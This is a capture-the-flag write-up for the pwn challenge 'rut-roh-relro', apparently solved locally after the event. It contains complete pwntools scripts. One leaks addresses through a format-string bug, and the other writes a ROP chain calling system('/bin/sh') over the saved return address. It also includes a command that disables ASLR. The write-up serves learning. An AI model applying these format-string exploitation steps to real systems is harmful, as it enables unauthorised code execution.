# PWN
## rut-roh-relro
`writer : Uno (yqroo)`
### Tools
- gdb + pwndbg
- pwntools
- ghidra

### Intro
I manage to solve this challenge almost a week after the competition over, well now i just wanna do write up and share my solver script cuz i get bored.

### Bug and Vulnerability
Format strings but FULL RELRO that's means we can't overwrite global offset table a.k.a GOT but we can still overwrite stack and gain control of rip and perform rop to call system('/bin/sh'), cool.

### Leak data
To make this challenge easier i decided to disable sistem aslr with `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space` command, this will disable our system aslr, what i do next is leaking program data and find offset,
here's my script to do that.

```python
from pwn import *

exe = './rut_roh_relro'
elf = context.binary = ELF(exe, checksec=False)

for i in range(1,100):
    p = process(level='error')
    p.sendline('AAAABBBB%{}$p'.format(i).encode())
    p.recvuntil(b'AAAABBBB')
    result = p.recvline(0)
    print(str(i) + ': ' + str(result))
    p.close()

```

with this script now i know stack address, meaning i can calculate saved return address, i also can leak libc base address by calculating it with `__libc_start_call_main+128` leak, and basically all things you need to know to pop shell, you can find all the data that i leak and use [here](https://github.com/UnoArroefy/CTF-Journey/blob/main/solve/PWN_roh-relro_la/data).

next step is to craft the exploit.

### Exploit
The scenario to pop shell is first leak libc, stack, and pie then overwrite stack with pop rdi, '/bin/sh' string, ret (because stack alignment issue), system. Quite simple right?? here's the script to do it.

```python
from pwn import *

exe = './rut_roh_relro'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level = 'warning'

p = elf.process()

payload = b'%41$p'
payload += b'OMO%71$pOMO'
payload += b'%73$p'
p.sendline(payload)
p.recvuntil(b'Here\'s your latest post:\n')
stack = eval(p.recvuntil(b'OMO').split(b'OMO')[0]) - 0x10d3
leak = eval(p.recvuntil(b'OMO').split(b'OMO')[0])
pie = eval(p.recvline(0)) - 0x1165
libc.address = leak - 0x29d90
info('libc : %#x', libc.address)
info('libc : %#x', libc.symbols.system)

pop_rdi = pie + 0x000000000000127b
ret = pie + 0x0000000000001016

write = {
    stack : pop_rdi,
    stack + 8 : next(libc.search(b'/bin/sh')),
    stack + 16 : ret,
    stack + 24 : libc.symbols.system 
}

payload = fmtstr_payload(6, write, write_size='short')
p.sendline(payload)
p.interactive()
```

and with that we pop shell and can cat flag.txt, note that this is on my local computer, because i didn't solved it when the competition. Hope you learn something new, i use automated payload because that was faster and easier.

Until we meet again.
